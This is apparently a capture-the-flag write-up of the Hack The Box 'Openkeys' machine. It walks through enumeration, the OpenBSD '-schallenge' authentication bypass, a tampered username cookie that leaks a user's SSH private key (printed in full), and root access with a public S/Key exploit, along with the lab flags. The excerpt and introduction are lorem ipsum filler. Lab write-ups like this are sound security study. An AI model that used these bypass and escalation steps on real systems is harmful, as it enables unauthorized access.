---
layout: single
title: Openkeys - Hack The Box
excerpt: "Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."
date: 2020-09-10
classes: wide
header:
  teaser: /assets/images/htb-writeup-openkeys/openkeys_logo.png
  teaser_home_page: true
  icon: /assets/images/openbsd.png
categories:
  - hackthebox
  - infosec
tags:  
  - openbsd
  - mysql
  - mattermost
  - hashcat
  - rules
---

![](/assets/images/htb-writeup-openkeys/openkeys_logo.png)

"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."

----------------

   ██╗   ██╗███████╗███████╗██████╗
   ██║   ██║██╔════╝██╔════╝██╔══██╗
   ██║   ██║███████╗█████╗  ██████╔╝
   ██║   ██║╚════██║██╔══╝  ██╔══██╗
   ╚██████╔╝███████║███████╗██║  ██║
    ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝

1. root@nidus:/git/htb/openkeys# nmap -Pn -n -sC -sV 10.10.10.199
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 8.1 (protocol 2.0)
    | ssh-hostkey:
    |   3072 5e:ff:81:e9:1f:9b:f8:9a:25:df:5d:82:1a:dd:7a:81 (RSA)
    |   256 64:7a:5a:52:85:c5:6d:d5:4a:6b:a7:1a:9a:8a:b9:bb (ECDSA)
    |_  256 12:35:4b:6e:23:09:dc:ea:00:8c:72:20:c7:50:32:f3 (ED25519)
    80/tcp open  http    OpenBSD httpd
    |_http-title: Site doesn't have a title (text/html).

    DIRB:
    ==> DIRECTORY: http://10.10.10.199/css/
    ==> DIRECTORY: http://10.10.10.199/fonts/
    ==> DIRECTORY: http://10.10.10.199/images/
    ==> DIRECTORY: http://10.10.10.199/includes/
    + http://10.10.10.199/index.html (CODE:200|SIZE:96)
    + http://10.10.10.199/index.php (CODE:200|SIZE:4837)
    ==> DIRECTORY: http://10.10.10.199/js/
    ==> DIRECTORY: http://10.10.10.199/vendor/

    NIKTO:
    + Server: OpenBSD httpd
    + Cookie PHPSESSID created without the httponly flag
    + Multiple index files found: /index.php, /index.html
    + OSVDB-3092: /includes/: This might be interesting...


2. Enumerating the webserver we find some interesting files right away.

  http://10.10.10.199/includes/auth.php.swp

  Download the swap-file and restor it by using 'vim -r auth.php.swp', save the file as auth.php (:w auth.php)

    root@nidus:/git/htb/openkeys# curl http://10.10.10.199/includes/auth.php.swp --output auth.php.swp
    root@nidus:/git/htb/openkeys# cat auth.php
      [..]
      $cmd = escapeshellcmd("../auth_helpers/check_auth " . $username . " " . $password);
      system($cmd, $retcode);
      [..]
      function init_session()
      {
          $_SESSION["logged_in"] = True;
          $_SESSION["login_time"] = $_SERVER['REQUEST_TIME'];
          $_SESSION["last_activity"] = $_SERVER['REQUEST_TIME'];
          $_SESSION["remote_addr"] = $_SERVER['REMOTE_ADDR'];
          $_SESSION["user_agent"] = $_SERVER['HTTP_USER_AGENT'];
          $_SESSION["username"] = $_REQUEST['username'];

  From the first snippet of the code we see that username and passwords are verified using '../auth_helpers/check_auth'
  In the second snippet we learn that the SESSION variable is controlled in the init-function, including username on the last line.

  Lastly, running strings on the swap file gives us a user - Jennifer.

    root@nidus:/git/htb/openkeys# strings auth.php.swp
      b0VIM 8.1
      jennifer
      openkeys.htb
      [..]

  Download the check_auth program, and enumerate it.
    root@nidus:/git/htb/openkeys# curl http://10.10.10.199/auth_helpers/check_auth --output check_auth
    root@nidus:/git/htb/openkeys# file check_auth
      check_auth: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /usr/libexec/ld.so, for OpenBSD, not stripped

  We could try to RE this ELF-file, however I'll go with this as a last resort. As for now it is not needed.


3. With all enumerated information, lets start to look for exploits. Pretty quickly we find an article covering
   four big OpenBSD vulnerabilities:
     - CVE-2019-19519 (Local privilege escalation)
     - CVE-2019-19520 (Local privilege escalation)
     - CVE-2019-19521 (Authentication Bypass)
     - CVE-2019-19522 (Local privilege escalation)

  CVE-2019-19521 tells us in short that we can bypass the auth by entering '-schallenge' as username, and any password.
  Trying this on our login prompt is successful, we are greeted with the text "OpenSSH key not found for user -schallenge"

  This is where I got stuck for a good while and had to turn to the forums for help. But as we could see before, the SESSION
  variable username can be controlled - and maybe tampered with in the cookie. Set the Name-filed to 'username' and
  Value-filed to 'jennifer'.

  Log in and out again, and voila! We got Jennifer's private key!

     -----BEGIN OPENSSH PRIVATE KEY-----
    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
    -----END OPENSSH PRIVATE KEY-----


4. Save the private key, login as Jennifer and grab user.txt.

    root@nidus:/git/htb/openkeys# ssh jennifer@openkeys.htb -i jennifer_id-rsa
      Last login: Wed Jun 24 09:31:16 2020 from 10.10.14.2
      OpenBSD 6.6 (GENERIC) #353: Sat Oct 12 10:45:56 MDT 2019

      Welcome to OpenBSD: The proactively secure Unix-like operating system.

      Please use the sendbug(1) utility to report bugs in the system.
      Before reporting a bug, please try to reproduce it with the latest
      version of the code.  With bug reports, please try to ensure that
      enough information to reproduce the problem is enclosed, and if a
      known fix for it exists, include that as well.

      openkeys$ id
        uid=1001(jennifer) gid=1001(jennifer) groups=1001(jennifer), 0(wheel)
      openkeys$ cat user.txt
        36ab21239a15c537bde90626891d2b10



██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██████╗  ██████╗  ██████╗ ████████╗
   ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝
   ██████╔╝██║   ██║██║   ██║   ██║
   ██╔══██╗██║   ██║██║   ██║   ██║
   ██║  ██║╚██████╔╝╚██████╔╝   ██║
   ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝


1. From our previous article, we also found three CVE's for Local PrivEsc, CVE-2019-19519, CVE-2019-19520 and CVE-2019-19522.
   A quick google for the CVE's we find a script called openbsd-authroot on github, download it and try it out.

    openkeys$ vi openbsd-authroot
    openkeys$ chmod +x openbsd-authroot
    openkeys$ ./openbsd-authroot
    openbsd-authroot (CVE-2019-19520 / CVE-2019-19522)
      [*] checking system ...
      [*] system supports S/Key authentication
      [*] id: uid=1001(jennifer) gid=1001(jennifer) groups=1001(jennifer), 0(wheel)
      [*] compiling ...
      [*] running Xvfb ...
      [*] testing for CVE-2019-19520 ...
      _XSERVTransmkdir: ERROR: euid != 0,directory /tmp/.X11-unix will not be created.
      [+] success! we have auth group permissions

      WARNING: THIS EXPLOIT WILL DELETE KEYS. YOU HAVE 5 SECONDS TO CANCEL (CTRL+C).

      [*] trying CVE-2019-19522 (S/Key) ...
      Your password is: EGG LARD GROW HOG DRAG LAIN
      otp-md5 99 obsd91335
      S/Key Password:

      openkeys# id
        uid=0(root) gid=0(wheel) groups=0(wheel), 2(kmem), 3(sys), 4(tty), 5(operator), 20(staff), 31(guest)
      openkeys# cat root.txt
        f3a553b1697050ae885e7c02dbfc6efa


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██╗███╗   ██╗███████╗ ██████╗ ██████╗ ███╗   ███╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
   ██║████╗  ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██╔████╔██║███████║   ██║   ██║██║   ██║██╔██╗ ██║
   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║╚██╔╝██║██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
   ██║██║ ╚████║██║     ╚██████╔╝██║  ██║██║ ╚═╝ ██║██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
   ╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝


OpenBSD Auth Bypass
  https://www.secpod.com/blog/openbsd-authentication-bypass-and-local-privilege-escalation-vulnerabilities/
  https://www.qualys.com/2019/12/04/cve-2019-19521/authentication-vulnerabilities-openbsd.txt

openbsd-authroot PrivEsc
  https://github.com/bcoles/local-exploits/blob/master/CVE-2019-19520/openbsd-authroot
